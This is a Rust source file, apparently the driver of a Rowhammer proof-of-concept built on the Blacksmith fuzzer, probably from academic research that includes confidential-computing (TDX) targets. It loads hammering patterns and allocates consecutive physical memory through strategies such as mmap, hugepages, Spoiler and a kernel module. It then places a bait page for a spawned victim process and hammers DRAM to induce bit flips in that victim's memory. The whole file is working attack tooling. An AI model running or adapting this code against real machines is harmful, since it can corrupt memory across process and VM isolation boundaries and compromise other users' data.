use std::{
    fmt::Debug,
    fs::File,
    io::{stdin, BufRead, BufReader},
    process::{Child, ChildStdin, ChildStdout, Command},
    thread::{self},
};

use anyhow::{bail, Context};
use bs_poc::{
    forge::{
        DummyHammerer, FuzzSummary, HammerResult, Hammerer, Hammering, HammeringPattern,
        PatternAddressMapper,
    },
    memory::{
        compact_mem, consec_alloc::ConsecAllocSpoiler, BytePointer, ConsecBlocks,
        ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn, HugepageAllocator, MemBlock,
        PfnResolver, VictimMemory,
    },
    retry,
    util::{
        init_logging_with_progress, AttackState, BlacksmithConfig, MemConfiguration, PipeIPC, IPC,
        PAGE_SIZE,
    },
    victim::{HammerVictim, HammerVictimMemCheck},
};
use bs_poc::{
    memory::consec_alloc::{
        ConsecAlloc, ConsecAllocBuddyInfo, ConsecAllocCoCo, ConsecAllocHugepageRnd,
        ConsecAllocMmap, ConsecAllocator,
    },
    memory::ConsecCheck,
};
use clap::Parser;
use indicatif::MultiProgress;
use log::{info, warn};

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The BlacksmithConfig
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
    #[clap(long = "consec-check", default_value = "bank-timing")]
    consec_check: ConsecCheckType,
    #[clap(long = "alloc-strategy", default_value = "mmap")]
    alloc_strategy: ConsecAllocType,
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// The target to hammer
    target: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum HammerStrategy {
    Dummy,
    Blacksmith,
    None,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecCheckType {
    BankTiming,
    None,
    Pfn,
}

#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecAllocType {
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    Hugepage,
    HugepageRnd,
    Mmap,
    Spoiler,
}

fn create_allocator_from_cli(
    alloc_strategy: ConsecAllocType,
    consec_checker: ConsecCheck,
    progress: Option<MultiProgress>,
) -> ConsecAlloc {
    match alloc_strategy {
        ConsecAllocType::BuddyInfo => {
            ConsecAlloc::BuddyInfo(ConsecAllocBuddyInfo::new(consec_checker))
        }
        ConsecAllocType::CoCo => ConsecAlloc::CoCo(ConsecAllocCoCo {}),
        ConsecAllocType::Mmap => ConsecAlloc::Mmap(ConsecAllocMmap::new(consec_checker, progress)),
        ConsecAllocType::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::new()),
        ConsecAllocType::HugepageRnd => ConsecAlloc::HugepageRnd(ConsecAllocHugepageRnd::new(1)),
        ConsecAllocType::Spoiler => ConsecAlloc::Spoiler(ConsecAllocSpoiler::new()),
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(&option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

fn create_consec_checker_from_cli(
    consec_check: ConsecCheckType,
    mem_config: MemConfiguration,
    conflict_threshold: u64,
    progress: Option<MultiProgress>,
) -> anyhow::Result<ConsecCheck> {
    Ok(match consec_check {
        ConsecCheckType::None => ConsecCheck::None(ConsecCheckNone {}),
        ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
        ConsecCheckType::BankTiming => ConsecCheck::BankTiming(
            ConsecCheckBankTiming::new_with_progress(mem_config, conflict_threshold, progress),
        ),
    })
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

unsafe fn alloc_memory(
    mut alloc_strategy: ConsecAlloc,
    mem_config: MemConfiguration,
    mapping: &PatternAddressMapper,
) -> anyhow::Result<ConsecBlocks> {
    let block_size = alloc_strategy.block_size();
    let block_shift = block_size.ilog2() as usize;
    let num_sets = mapping.aggressor_sets(mem_config, block_shift).len();

    compact_mem()?;
    let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size)?;
    memory.log_pfns();
    Ok(memory)
}

fn hammer(
    hammerer: HammerStrategy,
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
    victim: &mut dyn HammerVictim,
    mem_config: MemConfiguration,
    block_size: usize,
    memory: &ConsecBlocks,
) -> anyhow::Result<HammerResult> {
    let block_shift = block_size.ilog2();
    let hammerer: Box<dyn Hammering> = match hammerer {
        HammerStrategy::Blacksmith => {
            let hammering_addrs = mapping.get_hammering_addresses_relocate(
                &pattern.access_ids,
                mem_config,
                block_shift as usize,
                memory,
            )?;
            Box::new(Hammerer::new(
                mem_config,
                pattern.clone(),
                mapping.clone(),
                &hammering_addrs,
                &memory.blocks,
            )?)
        }
        HammerStrategy::Dummy => {
            let flip = mapping.get_bitflips_relocate(mem_config, &memory);
            let flip = flip
                .concat()
                .pop()
                .unwrap_or(memory.blocks[0].byte_add(0x42).ptr) as *mut u8;
            info!(
                "Running dummy hammerer with flip at VA 0x{:02x}",
                flip as usize
            );
            let hammerer = DummyHammerer::new(&memory, flip);
            Box::new(hammerer)
        }
        HammerStrategy::None => {
            warn!("No hammerer specified. Exiting.");
            return Ok(HammerResult { run: 0, attempt: 0 });
        }
    };
    let flips = mapping.bit_flips;
    info!("Expected bitflips: {:?}", flips);

    info!("Hammering pattern. This might take a while...");
    hammerer.hammer(victim, 3)
}

/// spawn a thread to log the victim's stderr
fn log_victim_stderr(victim: &mut Option<Child>) -> anyhow::Result<()> {
    if let Some(victim) = victim {
        let stderr = victim.stderr.take().context("victim stderr")?;
        thread::spawn(move || {
            let reader = BufReader::new(stderr);
            for line in reader.lines() {
                info!(target: "victim", "{}", line.unwrap());
            }
        });
    }
    Ok(())
}

fn spawn_victim(victim: &[String]) -> anyhow::Result<Option<Child>, std::io::Error> {
    let mut victim_args = victim.to_vec();
    let victim = victim_args.pop();
    victim
        .map(|victim| {
            Command::new(victim)
                .args(victim_args)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
        })
        .transpose()
}

fn inject_page<P: IPC<AttackState>>(channel: &mut P) -> anyhow::Result<()> {
    channel.send(AttackState::AttackerReady)?;

    let b = MemBlock::mmap(PAGE_SIZE)?;
    let pfn = b.pfn()?;
    info!("Victim block PFN: 0x{:02x}", pfn);

    info!("Waiting for signal {:?}", AttackState::VictimAllocReady);
    channel.wait_for(AttackState::VictimAllocReady)?;
    info!("Received signal {:?}", AttackState::VictimAllocReady);

    b.dealloc();
    warn!("TODO release victim page (determined by mapping)");
    Ok(())
}

fn piped_channel(child: &mut Child) -> anyhow::Result<PipeIPC<ChildStdout, ChildStdin>> {
    let child_in = child.stdin.take().context("piped_channel stdin")?;
    let child_out = child.stdout.take().context("piped_channel stdout")?;
    Ok(PipeIPC::new(child_out, child_in))
}

struct VictimProcess<P> {
    pipe: P,
}
impl<P: IPC<AttackState>> HammerVictim for VictimProcess<P> {
    fn init(&mut self) {
        info!("Victim process initialized");
    }

    fn check(&mut self) -> bool {
        info!("Victim process check");
        self.pipe
            .send(AttackState::AttackerHammerDone)
            .expect("send");
        info!("Reading pipe");
        let state = self.pipe.receive().expect("receive");
        info!("Received state: {:?}", state);
        state == AttackState::VictimHammerSuccess
    }

    fn log_report(&self) {
        info!("Victim process report");
    }
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();
    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    let consec_checker = create_consec_checker_from_cli(
        args.consec_check,
        mem_config,
        config.threshold,
        Some(progress.clone()),
    )?;
    let alloc_strategy =
        create_allocator_from_cli(args.alloc_strategy, consec_checker, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    info!("Starting bait allocation");
    let memory = alloc_memory(alloc_strategy, mem_config, &pattern.mapping)?;
    info!("Allocated {} bytes of memory", memory.len());

    let mut victim = spawn_victim(&args.target)?;
    log_victim_stderr(&mut victim)?;

    let mut hammer_victim: Box<dyn HammerVictim> = match &mut victim {
        Some(victim) => {
            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = piped_channel(victim)?;
            inject_page(&mut pipe)?;
            Box::new(VictimProcess { pipe })
        }
        None => {
            warn!(
            "No target specified. Consider `./hammer --config [...] your_victim your_victim_args`"
        );
            Box::new(HammerVictimMemCheck::new(mem_config, &memory))
        }
    };

    let result = hammer(
        args.hammerer,
        pattern.pattern,
        pattern.mapping,
        &mut *hammer_victim,
        mem_config,
        block_size,
        &memory,
    );
    match result {
        Ok(res) => {
            info!("{:?}", res);
            hammer_victim.log_report();
        }
        Err(e) => {
            warn!("Hammering not successful: {:?}", e);
        }
    }

    drop(hammer_victim);

    memory.dealloc();

    if let Some(victim) = victim {
        info!("Waiting for victim to finish");
        let output = victim.wait_with_output()?;
        info!("Captured output: {:?}", output);
    }
    info!("Goodbye.");

    Ok(())
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
